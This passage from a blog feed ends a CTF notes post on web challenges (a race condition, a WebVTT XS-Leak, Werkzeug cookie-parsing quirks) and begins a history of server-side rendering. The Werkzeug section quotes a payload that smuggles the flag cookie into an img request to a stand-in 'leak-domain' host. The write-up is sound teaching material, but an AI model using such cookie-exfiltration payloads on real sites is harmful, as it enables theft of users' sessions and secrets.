class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    token <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        user <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">getUserBy</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            enteredPremiumPin <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span><span class="token string">"premiumPin"</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>enteredPremiumPin <span class="token operator">==</span> premiumPin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                user<span class="token punctuation">.</span>isPremium <span class="token operator">=</span> <span class="token number">1</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// ...</span>            <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">updateUserByToken</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> user<span class="token punctuation">)</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token string">'yes ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The admin bot executes the <code>updateUser</code> function every time, setting the <code>isPremium</code> property of the admin user to 1.</p><p>Since the user is a global variable and the database operations are asynchronous, if the execution is fast enough, the <code>user</code> inside the <code>updateUser</code> function will be a different user, allowing the user to set their own account as a premium account.</p><p>The intended solution is to use Scroll to Text Fragment (STTF) to resolve the issue.</p><h2><span id="n1ctf-ytiruces">N1CTF - ytiruces</span></h2><p>References:</p><ol><li><a href="https://dem0dem0.top/2023/10/20/n1ctf2023/">https://dem0dem0.top/2023/10/20/n1ctf2023/</a></li><li><a href="https://nese.team/posts/n1ctf2023/">https://nese.team/posts/n1ctf2023/</a></li></ol><p>Using WebVTT, a subtitle display format, in conjunction with the CSS selector <code>video::cue(v[voice^=&quot;n1&quot;])</code> to perform an XS-Leak attack.</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/::cue">https://developer.mozilla.org/en-US/docs/Web/CSS/::cue</a></p><p>It’s an interesting selector indeed.</p><h2><span id="werkzeug-cookie-parsing-quirks">Werkzeug cookie parsing quirks</span></h2><p>Source: <a href="https://mizu.re/post/another-html-renderer">Another HTML Renderer</a></p><p>This challenge is also from <a href="https://twitter.com/kevin_mizu">@kevin_mizu</a>. We have already introduced two challenges from him before, and this one is another interesting challenge!</p><p>In this challenge, there is an admin bot that sets a cookie containing a flag. The goal is to steal this cookie. The core code is as follows:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/render"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    settings <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        settings <span class="token operator">=</span> loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span> <span class="token keyword">pass</span>    <span class="token keyword">if</span> settings<span class="token punctuation">:</span>        res <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span>            backgroundColor<span class="token operator">=</span>settings<span class="token punctuation">[</span><span class="token string">"backgroundColor"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"backgroundColor"</span> <span class="token keyword">in</span> settings <span class="token keyword">else</span> <span class="token string">"#ffde8c"</span><span class="token punctuation">,</span>            textColor<span class="token operator">=</span>settings<span class="token punctuation">[</span><span class="token string">"textColor"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"textColor"</span> <span class="token keyword">in</span> settings <span class="token keyword">else</span> <span class="token string">"#000000"</span><span class="token punctuation">,</span>            html<span class="token operator">=</span>settings<span class="token punctuation">[</span><span class="token string">"html"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"html"</span> <span class="token keyword">in</span> settings <span class="token keyword">else</span> <span class="token string">""</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> backgroundColor<span class="token operator">=</span><span class="token string">"#ffde8c"</span><span class="token punctuation">,</span> textColor<span class="token operator">=</span><span class="token string">"#000000"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">,</span> <span class="token string">"&#123;&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>In Python, the page is rendered based on the parameters in the cookie. The template is as follows:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span>  <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>render<span class="token punctuation">"</span></span>  <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span>  <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;style>* &#123; text-align: center; &#125;&lt;/style>&#123;&#123;html&#125;&#125;<span class="token punctuation">"</span></span>  <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>70%<span class="token punctuation">"</span></span>  <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>500px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Even if you control the HTML, you can only do so within a sandbox iframe, where you cannot execute code and it is not the same origin. In the past, stealing a cookie usually required a same-origin XSS vulnerability.</p><p>On the frontend, you can set cookies, but the string “html” is filtered out, so you cannot set the cookie with the string “html”:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">saveSettings</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">settings</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">settings=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>settings<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">getSettings</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        s <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">delete</span> s<span class="token punctuation">.</span>html<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>d <span class="token operator">!=</span> d<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> d<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        window<span class="token punctuation">.</span>settings <span class="token operator">=</span> <span class="token function">getSettings</span><span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">saveSettings</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>settings<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">renderSettings</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>settings<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        window<span class="token punctuation">.</span>settings <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    window<span class="token punctuation">.</span>settings <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>settings<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>So how do you solve this challenge? It all comes down to the quirks of Werkzeug’s cookie parsing logic.</p><p>Let’s first talk about how to bypass the check for the string “html”. In Werkzeug, if your cookie value is wrapped in <code>&quot;&quot;</code>, it will be decoded first. Therefore, <code>&quot;\150tml&quot;</code> will be decoded as <code>&quot;html&quot;</code>, allowing you to bypass the check for the keyword “html”.</p><p>But after bypassing that, how do you get the flag? This is where the second quirk of Werkzeug’s cookie parsing comes into play. When Werkzeug parses a cookie, if it encounters a <code>&quot;</code> character, it will parse until the next <code>&quot;</code> character.</p><p>For example, if the cookie content is like this:</p><pre class="line-numbers language-none"><code class="language-none">Cookie: cookie1&#x3D;&quot;abc; cookie2&#x3D;def&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The result will be: <code>&quot;cookie1&quot;: &quot;abc; cookie2=def&quot;</code></p><p>In other words, if we sandwich the flag between two cookies, we can include the flag in the HTML, and then find a way to retrieve the cookie. Here is an example payload provided by the author:</p><pre class="line-numbers language-none"><code class="language-none">Cookie: settings&#x3D;&quot;&#123;\&quot;\150tml\&quot;: &quot;&lt;img src&#x3D;&#39;https:&#x2F;&#x2F;leak-domain&#x2F;?cookie&#x3D; ;flag&#x3D;GH&#123;FAKE_FLAG&#125;; settings&#x3D;&#39;&gt;\&quot;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>After reading this challenge, I suddenly remembered a similar challenge from DiceCTF 2023, where Jetty had this behavior: <a href="https://blog.huli.tw/2023/03/26/en/dicectf-2023-writeup/#web-jnotes-6-solves">Web - jnotes (6 solves)</a>. It seems that there are quite a few web frameworks with this parsing behavior.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Due to being busy lately, I haven’t been participating in CTFs as much in the past two or three months. However, I still come across some interesting challenges on Twitter. Even though I don’t have time to solve them, I still take notes because if I don’t, I won’t be able to solve them later for sure.&lt;/p&gt;
&lt;p&gt;This post mainly documents some web front-end related challenges. Since I might not have personally solved them, the content is based on references from others’ notes, with some personal insights added.&lt;/p&gt;
&lt;p&gt;Keyword list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;copy paste XSS&lt;/li&gt;
&lt;li&gt;connection pool&lt;/li&gt;
&lt;li&gt;content type UTF16&lt;/li&gt;
&lt;li&gt;multipart&amp;#x2F;mixed&lt;/li&gt;
&lt;li&gt;Chrome DevTools Protocol&lt;/li&gt;
&lt;li&gt;new headless mode default download&lt;/li&gt;
&lt;li&gt;Scroll to Text Fragment (STTF)&lt;/li&gt;
&lt;li&gt;webVTT cue xsleak&lt;/li&gt;
&lt;li&gt;flask&amp;#x2F;werkzeug cookie parsing quirks&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Exploring Various SSR (Server-side rendering) from a Historical Perspective</title>
    <link href="https://blog.huli.tw/2023/11/27/en/server-side-rendering-ssr-and-isomorphic/"/>
    <id>https://blog.huli.tw/2023/11/27/en/server-side-rendering-ssr-and-isomorphic/</id>
    <published>2023-11-27T06:40:00.000Z</published>
    <updated>2023-11-29T12:47:11.342Z</updated>
    
    <content type="html"><![CDATA[<p>Did you know that when you discuss SSR with your friends, it’s highly likely that your understanding of SSR differs? Let’s take a few scenarios. Which ones do you consider as SSR?</p><ol><li>Generating the view from the backend using PHP.</li><li>Frontend is a React-based SPA, but if the backend detects a search engine, it switches to a different template that is specifically designed for search engines instead of the React-rendered page.</li><li>Frontend is a React-based SPA, but it uses Prerender to render the page as HTML and then serves it to the search engine (regular users still get the SPA experience). The difference from the previous scenario is that the view seen by users and search engines is mostly the same.</li><li>Frontend is a React-based SPA, and the backend uses <code>renderToString</code> to render React into a string, but there is no data. The data is fetched on the frontend.</li><li>Frontend is a React-based SPA, and the backend makes API calls to fetch data for each page. After fetching the data, it calls <code>renderToString</code> to output HTML. On the client-side, hydration is performed to make the page interactive.</li></ol><p>Some people believe that any view generated by the backend is considered SSR, so all scenarios 1 to 5 are SSR. Others think that the frontend must be an SPA for it to be called SSR, so scenarios 2 to 5 are SSR. Yet, some people consider hydration as the key aspect of SSR, so only scenario 5 (or 45) is SSR.</p><span id="more"></span><h2><span id="why-this-article">Why this article?</span></h2><p>Five years ago, I wrote an article discussing SPA and SSR: <a href="https://life-huli-tw.translate.goog/2018/05/04/introduction-mvc-spa-and-ssr-545c941669e9/?_x_tr_sl=zh-TW&_x_tr_tl=en&_x_tr_hl=zh-TW&_x_tr_pto=wapp">Understanding Technical Terms with Xiao Ming: MVC, SPA, and SSR</a>. My thoughts back then align with my current ones.</p><p>By “current me,” I mean that I haven’t fully organized my thoughts yet. I’m writing this preface, and the content below is still unfinished. I will share the thoughts of “future me” at the end. However, for now, my current perspective is that “not all ways of generating views from the server can be ‘appropriately’ called SSR.”</p><p>Let’s consider a hypothetical scenario:</p><p>A: Hey, how do you render your company’s web pages?<br>B: We use SSR.<br>A: Oh, so what framework do you use for SSR?<br>B: Just plain PHP, no framework. The frontend is built with jQuery.</p><p>Now, another example:</p><p>A: Dealing with SSR issues has been quite frustrating lately. It’s challenging to handle the data.<br>B: It’s been fine for us. We’ve been using PHP without any major issues.</p><p>Although the term “server-side rendering” literally means rendering by the server, so there’s no problem in calling PHP SSR based on its literal meaning, I believe the key question is “Why do we need the term SSR?”</p><p>My understanding is that in the era before SPA became popular, there wasn’t much that fell under CSR (Client-side rendering), so there was no need for the term SSR. At that time, you would simply say, “We use PHP” rather than saying, “We use PHP for SSR.”</p><p>It’s somewhat similar to when I ask my friend how much his lunchbox costs, and he replies, “100 bucks” instead of “100 New Taiwan Dollars” because we assume the currency is New Taiwan Dollars, so there’s no need to explicitly mention it. Similarly, back then, there was only one path of rendering from the server, so there was no need to specifically mention SSR.</p><p>However, with the rise of SPAs, many things started to shift towards CSR. This led to problems that only CSR encounters, such as SEO. In such cases, certain aspects need to be handled by the server to solve these problems. In this context, the term “Server-side rendering” took on a new meaning, becoming a “server-side solution to address CSR issues.”</p><p>Therefore, calling PHP SSR is not entirely accurate; it lacks meaning.</p><p>It’s like if we define “beverage” as “a drinkable liquid,” can you say that hot and sour soup is also a type of beverage? Technically, there’s no issue with the definition, but when someone asks you, “What’s your favorite beverage?” would you say hot and sour soup? Probably not. Similarly, we don’t refer to hot and sour soup as a beverage.</p><p>Likewise, although SSR literally means that, PHP, which is a traditional server-side content rendering solution, can be called SSR, but you wouldn’t refer to it that way. SSR is more suitable to refer to a “server-side solution used to address SPA issues.”</p><p>I started to become curious at this point. Was SSR really not commonly used before the popularity of SPA and CSR? If so, when did it start? Also, my understanding of SSR basically started with React. So, did earlier frameworks like Angular, Ember, or even Backbone not have this issue? If they did, what were their solutions called?</p><p>So, I embarked on a journey of exploration that would take a lot of time, perhaps discussing issues that may not be so important, but I enjoyed the process.</p><h2><span id="when-did-spa-become-popular">When did SPA become popular?</span></h2><p>As mentioned earlier, my argument is that the term “SSR” started to become popular after the rise of SPA, specifically referring to server-side solutions for handling CSR and SPA issues.</p><p>I believe that the development of SPA is closely related to the overall development of frontend web technologies. So, let’s take a look back at history!</p><p>JavaScript was officially introduced in 1995. Although JavaScript’s functionality was not as mature at the time, there were already other technologies that could run an application on a webpage, such as Java Applets.</p><p>Flash was released in 1996. In the early days when JavaScript was not as powerful, Java Applets or Flash were used to create more complete web applications.</p><p>So, when did JavaScript mature enough to stand on its own and be used to write a web application? The answer is related to technological advancements. As a web application that needs to communicate with the backend, what is most needed?</p><p>It is something that now exists as naturally as air and water: XMLHttpRequest.</p><p>To be able to operate independently and communicate with the server without page reloads, XMLHttpRequest is a necessary condition. We needed the XMLHttpRequest API to exchange data with the server without page reloads.</p><p>However, in the beginning, not all browsers used XMLHttpRequest. Microsoft, which had the concept first, used ActiveXObject. This can be verified from the first version of jQuery’s source code from 2006:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// If IE is used, create a wrapper for the XMLHttpRequest object</span><span class="token keyword">if</span> <span class="token punctuation">(</span> jQuery<span class="token punctuation">.</span>browser<span class="token punctuation">.</span>msie <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> XMLHttpRequest <span class="token operator">==</span> <span class="token string">"undefined"</span> <span class="token punctuation">)</span>  <span class="token function-variable function">XMLHttpRequest</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span>      navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"MSIE 5"</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">?</span>        <span class="token string-property property">"Microsoft.XMLHTTP"</span> <span class="token operator">:</span> <span class="token string">"Msxml2.XMLHTTP"</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After mentioning XMLHttpRequest, it is natural to talk about Ajax. The term “Ajax” comes from an article published by Jesse James Garrett on February 18, 2005, titled <a href="https://web.archive.org/web/20061107032631/http://www.adaptivepath.com/publications/essays/archives/000385.php">Ajax: A New Approach to Web Applications</a>. It describes a new communication pattern using HTML, CSS, DOM, and XMLHttpRequest, which I believe is the prototype of SPA.</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p2.png" alt="ajax"></p><p>(Image from the mentioned article)</p><p>In the article, there is also a mention of the difference between XMLHttpRequest and Ajax:</p><blockquote><p>Q. Is Ajax just another name for XMLHttpRequest?<br>A. No. XMLHttpRequest is only part of the Ajax equation. XMLHttpRequest is the technical component that makes the asynchronous server communication possible; Ajax is our name for the overall approach described in the article, which relies not only on XMLHttpRequest but on CSS, DOM, and other technologies.</p></blockquote><p>From historical data, it seems that Microsoft Outlook was the earliest product to mention and utilize these technologies, starting in 2000. However, in terms of widespread use and popularization of the term, it belongs to Google around 2004-2005.</p><p>Around this time, the JavaScript ecosystem also experienced vigorous development. Many libraries emerged, such as Prototype, Dojo Toolkit, MooTools, and the still-existing jQuery, which further advanced frontend web development. In 2006, YUI (Yahoo! User Interface Library) was born, and Ext JS, a framework specifically designed for web applications, appeared in 2007.</p><p>Although these libraries make web development easier, SPA did not become popular until the birth of two pioneers.</p><p>On October 13, 2010, Backbone.js released its first version, followed by the initial release of AngularJS a week later on October 20.</p><p>A year later, other SPA frontend frameworks emerged. Ember.js was released on December 8, 2011, and Meteor.js appeared on January 20, 2012.</p><p>Typically, it takes at least six months to a year for a new framework to become popular. Therefore, I believe that 2011 and 2012 marked the beginning of the rise of SPA. But how can we support this claim?</p><p>Keyword search trends to some extent represent the popularity of certain technical terms at the time. From the graph below, we can see that the term “SPA” started to climb around 2011 and 2012, which aligns with my speculation (although this data may not be very accurate, I couldn’t think of a better source at the moment):</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p3.png" alt="SPA Search Trend"></p><p>(As for the peak in 2004 and 2005, I don’t know, but I’m curious to find out. Maybe it’s related to the popularity of various Google services? If anyone has any clues, feel free to message or comment to discuss.)</p><p>The rest of the story is more familiar. React was officially released in May 2013, followed by Vue in February 2014. With the rise of frontend frameworks, SPA became increasingly popular and eventually became the mainstream approach to frontend development today.</p><h2><span id="how-did-early-spas-solve-the-csr-problem">How did early SPAs solve the CSR problem?</span></h2><p>From the history of development mentioned above, it is clear that Backbone.js and AngularJS were the pioneers that ushered in the era of SPAs. But how did they solve the CSR problem, such as SEO?</p><p>Let’s start with AngularJS. I found a project on GitHub from 2013: <a href="https://github.com/runvnc/angular-on-server/tree/b84bcea97037adaffc83cf4869fe9a008c7db3a8">angular-on-server</a>. In the project’s wiki introduction, it states:</p><blockquote><p>We need to pre-render pages on the server for Google to index. We don’t want to have to repeat ourselves on the back end. I found a few examples of server-side rendering for Backbone applications, but none showing how to do it with AngularJS. To make this work I have modified a couple of Node modules, jsdom and xmlhttprequest. They are loaded from local subdirectories (&#x2F;jsdom-with-xmlhttprequest and &#x2F;xmlhttprequest).</p></blockquote><p>If this is true, it means that AngularJS had limited SSR solutions at that time, with most solutions being based on Backbone.js.</p><p>Based on the information I found, it seems to be the case. For example, this question from 2013: <a href="https://stackoverflow.com/questions/16232631/angularjs-server-side-rendering">AngularJS - server-side rendering</a>. From the answers, it is evident that there were indeed limited solutions available.</p><p>AngularJS officially supported SSR only in late June 2015, as mentioned in this presentation: <a href="https://www.youtube.com/watch?v=0wvZ7gakqV4">Angular 2 Server Rendering</a>. A few days after the presentation, they open-sourced <a href="https://github.com/angular/universal/tree/e5b088ef4a59e59461fee31a21c2a81b742a7df5">Universal Angular 2</a>, which is the predecessor of Angular Universal.</p><p>In the README at that time, it stated:</p><blockquote><p>Universal (isomorphic) JavaScript support for Angular 2</p></blockquote><p>The term “isomorphic” should bring back memories for many people, but we’ll discuss that later. Now, let’s see how Backbone.js solved the SPA problem.</p><p>I found an ancient example on GitHub from 2011: <a href="https://github.com/runemadsen/Backbone-With-Server-Side-Rendering">Backbone-With-Server-Side-Rendering</a>. The README states:</p><blockquote><p>Backbone.js is a great tool for organizing your javascript code into models, collections, and views, without tying your data to the DOM elements. However, most tutorials show how to render the HTML only via Backbone (client-side), which means that none of your content is crawled by search engines. This is possibly a major problem if you’re not making an app hidden behind an authentication system.</p></blockquote><p>The unique thing about this project is that SSR (Server-Side Rendering) is implemented through Ruby on Rails. However, after examining the source code, it seems more like an experimental project. The HTML is outputted by the backend and then handled by Backbone.js on the frontend. It is a simple example rather than a complete demo.</p><p>If you want a more complete solution, the one to consider is <a href="https://github.com/rendrjs/rendr">Rendr</a>, which was open-sourced by Airbnb in 2013.</p><p>On January 30, 2013, Airbnb’s tech blog published a new article titled <a href="https://web.archive.org/web/20130711035708/http://nerds.airbnb.com/weve-launched-our-first-nodejs-app-to-product/">Our First Node.js App: Backbone on the Client and Server</a>. It discusses the issues with Single Page Applications (SPAs) and the challenge of integrating logic on both the frontend and backend. The ultimate solution presented in the article is the Rendr package, which allows executing Backbone.js on the server.</p><p>The open-sourcing of Rendr was announced in an article three months later, titled <a href="https://web.archive.org/web/20130623194723/http://nerds.airbnb.com/weve-open-sourced-rendr-run-your-backbonejs-a/">We’ve open sourced Rendr: Run your Backbone.js apps in the browser and Node.js</a>. It states:</p><blockquote><p>Many developers shared the same pain points with the traditional client-side MVC approach: poor pageload performance, lack of SEO, duplication of application logic, and context switching between languages.</p></blockquote><p>This indicates that many developers at that time were aware of the issues with SPAs and were seeking a more comprehensive solution.</p><p>To execute Backbone.js on the server, a prerequisite is that the server must be able to run JavaScript.</p><p>Node.js was released in 2009, and Express came out at the end of 2010, while NPM was introduced in 2011. By mid-2012, Node.js was still at version <a href="https://nodejs.org/en/blog/release/v0.8.0/">v0.8.0</a>, which was an early stage. Looking back now, Node.js started to be widely used around 2012-2013.</p><p>In summary, based on the information I found, the library that was perhaps widely used for SSR earliest was Rendr, introduced in 2013. It can achieve the following: “rendering on the server-side initially, but then taken over by JavaScript on the client-side,” as mentioned in Airbnb’s article:</p><blockquote><p>Your great new product can run on both sides of the wire, serving up real HTML on first pageload, but then kicking off a client-side JavaScript app. In other words, the Holy Grail.</p></blockquote><p>The image below illustrates the so-called Holy Grail, taken from Airbnb’s original article:</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p4.png" alt="holy grail"></p><p>When it comes to this point, let’s organize the timeline and my personal speculation.</p><p>Since the release of Backbone.js at the end of 2010, SPA (Single Page Application) has gradually become popular, and people have also realized the problems encountered in front-end rendering. Therefore, they started to implement different solutions, which is server-side rendering.</p><p>Backbone.js continued until 2013 when Airbnb open-sourced Rendr, finally providing an ideal solution: “initial rendering on the server-side, and subsequent rendering on the client-side, with both client and server sharing the same codebase.”</p><p>The concept of “running the same code on both the client and the server” is what was mentioned earlier as isomorphic.</p><p>By the way, Ember.js’s official SSR (Server-Side Rendering) solution should be this one at the end of 2014: <a href="https://blog.emberjs.com/inside-fastboot-the-road-to-server-side-rendering/">Inside FastBoot: The Road to Server-Side Rendering</a></p><p>One more thing to mention, according to the article <a href="https://blog.risingstack.com/the-history-of-react-js-on-a-timeline/">The History of React.js on a Timeline</a>, <a href="https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66">FaxJS</a> is the predecessor of React, and when it was open-sourced at the end of 2011, it already had an API for server-side rendering, which could render components into static HTML and reattach events on the client-side: <a href="https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66#optional-server-side-rendering">https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66#optional-server-side-rendering</a></p><h2><span id="isomorphic-javascript">Isomorphic JavaScript</span></h2><p>The term “Isomorphic JavaScript” comes from an article published by Charlie Robbins on October 18, 2011: <a href="https://web.archive.org/web/20170703210112/https://blog.nodejitsu.com/scaling-isomorphic-javascript-code/">Scaling Isomorphic Javascript Code</a></p><p>The article defines Isomorphic as follows:</p><blockquote><p>Javascript is now an isomorphic language. By isomorphic we mean that any given line of code (with notable exceptions) can execute both on the client and the server.</p></blockquote><p>More details can be found in an article 